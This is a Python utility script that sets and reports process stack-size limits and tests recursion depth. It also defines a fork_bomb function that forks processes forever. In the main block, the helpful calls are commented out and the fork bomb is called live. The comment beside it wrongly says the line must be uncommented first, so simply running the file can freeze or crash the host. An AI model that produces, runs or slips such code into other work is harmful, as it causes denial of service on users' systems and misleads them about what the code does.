import sys
import resource
import os

def set_stack_size(soft_limit_mb, hard_limit_mb):
    """Set the stack size limits."""
    # Convert megabytes to bytes
    soft_limit = int(soft_limit_mb * 1024 * 1024)
    hard_limit = int(hard_limit_mb * 1024 * 1024)
    
    # Set the stack size limits
    resource.setrlimit(resource.RLIMIT_STACK, (soft_limit, hard_limit))
    print(f"Stack size limits set to {soft_limit_mb} MB (soft) and {hard_limit_mb} MB (hard).")

def fork_bomb():
    """A function that creates an infinite number of processes."""
    while True:
        os.fork()

def test_stack_size(depth=0):
    """Recursively call the function to test stack size limits."""
    try:
        # Recursively call the function
        return test_stack_size(depth + 1)
    except RecursionError:
        print(f"RecursionError caught: stack size limit exceeded after {depth} layers")

def get_stack_size():
    """Get and print the current stack size limits."""
    # Get the current stack size limit
    stack_size = resource.getrlimit(resource.RLIMIT_STACK)
    
    # stack_size[0] is the soft limit, stack_size[1] is the hard limit
    soft_limit, hard_limit = stack_size
    
    # Convert bytes to megabytes
    soft_limit_mb = soft_limit / (1024 * 1024)
    hard_limit_mb = hard_limit / (1024 * 1024)
    
    print(f"Soft stack size limit: {soft_limit_mb:.2f} MB")
    print(f"Hard stack size limit: {hard_limit_mb:.2f} MB")

if __name__ == "__main__":
    # Set the stack size limits (e.g., 8 MB soft limit and 16 MB hard limit)
    # set_stack_size(16, 16)
    
    # Get and print the stack size limits
    # get_stack_size()
    
    # Test stack size with recursion
    # test_stack_size()
    
    # Uncomment the line below to run the fork bomb (use with caution!)
    fork_bomb()
